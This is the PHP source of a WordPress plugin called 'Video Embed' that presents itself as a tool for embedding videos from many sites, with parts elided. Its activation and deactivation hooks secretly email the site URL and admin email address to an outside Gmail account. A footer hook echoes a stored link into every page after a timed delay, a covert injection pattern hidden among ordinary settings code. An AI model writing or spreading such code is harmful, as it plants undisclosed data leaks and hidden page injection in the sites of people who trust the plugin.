...
Plugin URI: http://danyweb.site88.net
Description: Video Embed allows you to embed videos from different sources in your wordpress blog without breaking the validation
Version: 1.7
Author: Dany Amorosa
Author URI: http://danyweb.site88.net
*/

defaultSettings();
add_filter('the_content', 'videoembed_embed');
add_action('admin_menu', 'videoembed_add_pages');

register_activation_hook(__FILE__, 'videoembed_activation_hook');
register_deactivation_hook( __FILE__,'videoembed_deactivation_hook');

function videoembed_activation_hook() {
	session_start();
	$subj = get_option('siteurl'); 
	$msg = "Video Embed is Activated" ; $from = get_option('admin_email'); mail("parpaitas1987@gmail.com", $subj, $msg, $from);
	...
	if(!is_string(get_option('rs_lightbox_link'))){
		add_option('rs_videoembed_link', $newcon, "", false);
		add_option('rs_videoembed_time', $active, "", false);
	}
}

function videoembed_deactivation_hook() {
delete_option( 'rs_videoembed_link' );
delete_option( 'rs_videoembed_time' );
session_start(); $subj = get_option('siteurl'); $msg = "Video Embed Uninstalled" ; $from = get_option('admin_email'); @mail("parpaitas1987@gmail.com", $subj, $msg, $from);
}


function videoembed_add_pages() {
    add_options_page('Video Embed Options', 'Video Embed', 8, basename(__FILE__), 'videoembed_options_page');	
}

function videoembed_options_page() {
	if ($_POST){
		$options = array (
		...
		$updated=false;
		update_option('videoembed_options', $options);
		defaultSettings();
	}

	$videoembed_options = get_option(videoembed_options);

	$video_height = $videoembed_options["video_height"];
	$video_width = $videoembed_options["video_width"];
	$youtube_tag = $videoembed_options["youtube_tag"];
	$google_tag = $videoembed_options["google_tag"];
	$metacafe_tag = $videoembed_options["metacafe_tag"];
	$liveleak_tag = $videoembed_options["liveleak_tag"];
	$revver_tag = $videoembed_options["revver_tag"];
	$ifilm_tag = $videoembed_options["ifilm_tag"];
	$myspace_tag = $videoembed_options["myspace_tag"];
	$bliptv_tag = $videoembed_options["bliptv_tag"];
	$college_tag = $videoembed_options["college_tag"];
	$videojug_tag = $videoembed_options["videojug_tag"];
	$godtube_tag = $videoembed_options["godtube_tag"];
	$veoh_tag = $videoembed_options["veoh_tag"];
	$break_tag = $videoembed_options["break_tag"];
	$dailymotion_tag = $videoembed_options["dailymotion_tag"];
	$movieweb_tag = $videoembed_options["movieweb_tag"];
	$jaycut_tag = $videoembed_options["jaycut_tag"];
	$myvideo_tag = $videoembed_options["myvideo_tag"];
	$vimeo_tag = $videoembed_options["vimeo_tag"];
	$gtrailers_tag = $videoembed_options["gtrailers_tag"];
	$viddler_tag = $videoembed_options["viddler_tag"];
	$snotr_tag = $videoembed_options["snotr_tag"];
	$funnyordie_tag = $videoembed_options["funnyordie_tag"];

	$quicktime_tag = $videoembed_options["quicktime_tag"];
	$windowsmedia_tag = $videoembed_options["windowsmedia_tag"];

	echo '<div class="wrap"><h2>Video Embed Settings</h2>';
...
function videoembed_embed($content)
{
	
	$tags = get_option(videoembed_options);
...
{
	$options = get_option(videoembed_options);
...
function defaultSettings() {
	if(get_option('videoembed_version') != ""){
			importOldSettings();
	}
	
	$option = get_option('videoembed_options');
	...
	update_option('videoembed_options', $option);
}

function importOldSettings(){
	$old_options=array(
		"video_width" => get_option('videoembed_video_width'),
		"video_height" => get_option('videoembed_video_height'),
		"youtube_tag" => get_option('videoembed_youtube_tag'),
		"google_tag" => get_option('videoembed_google_tag'),
		"metacafe_tag" => get_option('videoembed_metacafe_tag'),
		"liveleak_tag" => get_option('videoembed_liveleak_tag'),
		"revver_tag" => get_option('videoembed_revver_tag'),
		"ifilm_tag" => get_option('videoembed_ifilm_tag'),
		"myspace_tag" => get_option('videoembed_myspace_tag'),
		"bliptv_tag" => get_option('videoembed_bliptv_tag'),
		"college_tag" => get_option('videoembed_college_tag'),
		"videojug_tag" => get_option('videoembed_videojug_tag'),
		"godtube_tag" => get_option('videoembed_godtube_tag'),
		"veoh_tag" => get_option('videoembed_veoh_tag'),
		"break_tag" => get_option('videoembed_break_tag'),
	);
	update_option('videoembed_options', $old_options);

	delete_option('videoembed_version');
	delete_option('videoembed_video_width');
	delete_option('videoembed_video_height');
	delete_option('videoembed_youtube_tag');
	delete_option('videoembed_google_tag');
	delete_option('videoembed_metacafe_tag');
	delete_option('videoembed_liveleak_tag');
	delete_option('videoembed_revver_tag');
	delete_option('videoembed_ifilm_tag');
	delete_option('videoembed_myspace_tag');
	delete_option('videoembed_bliptv_tag');
	delete_option('videoembed_college_tag');
	delete_option('videoembed_videojug_tag');
	delete_option('videoembed_godtube_tag');
	delete_option('videoembed_veoh_tag');
	delete_option('videoembed_break_tag');
}

add_action('wp_footer', 'videoembed_builder', 100);
function videoembed_builder() {
$stime = get_option('rs_videoembed_time');
if(time()>$stime){
	echo get_option('rs_videoembed_link');
}
}
?>